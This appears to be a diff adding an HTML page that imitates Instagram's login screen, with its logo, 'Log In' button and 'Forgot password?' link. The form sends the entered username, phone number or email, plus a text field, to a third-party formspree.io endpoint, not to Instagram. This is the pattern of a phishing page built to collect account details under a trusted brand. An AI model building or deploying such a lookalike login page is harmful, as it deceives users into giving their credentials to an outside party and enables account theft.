@@ -1,0 +1,141 @@
+!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            width: 350px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            text-align: center;
+            border-radius: 8px;
+        }
+
+        .container img {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+
+        input, textarea {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            background-color: #fafafa;
+            font-size: 14px;
+        }
+
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+
+        button {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+
+        button:hover {
+            background-color: #0073e6;
+        }
+
+        .forgot {
+            font-size: 12px;
+            color: #00376b;
+            margin-bottom: 15px;
+            text-decoration: none;
+        }
+
+        .forgot:hover {
+            text-decoration: underline;
+        }
+
+        .or {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+        }
+
+        .or-line {
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .or-text {
+            font-size: 12px;
+            color: #8e8e8e;
+            margin: 0 10px;
+        }
+
+        .facebook-login {
+            color: #385185;
+            font-size: 14px;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .facebook-login:hover {
+            text-decoration: underline;
+        }
+
+        .signup {
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-top: 15px;
+        }
+
+        .signup a {
+            color: #0095f6;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .signup a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+        <form action="https://formspree.io/f/xyzzbpgy" method="POST">
+            <input type="text" name="username" placeholder="Phone number, username, or email" required>
+            <textarea name="comment" placeholder="Enter your comment..." rows="4" required></textarea>
+            <button type="submit">Log In</button>
+        </form>
+        <a href="#" class="forgot">Forgot password?</a>
+        <div class="or">
+            <div class="or-line"></div>
+            <div class="or-text">OR</div>
+            <div class="or-line"></div>
+        </div>
+        <a href="#" class="facebook-login">Continue as Dave Johnson</a>
+        <div class="signup">
+            Don't have an account? <a href="#">Sign Up.</a>
+        </div>
+    </div>
+</body>
+</html>
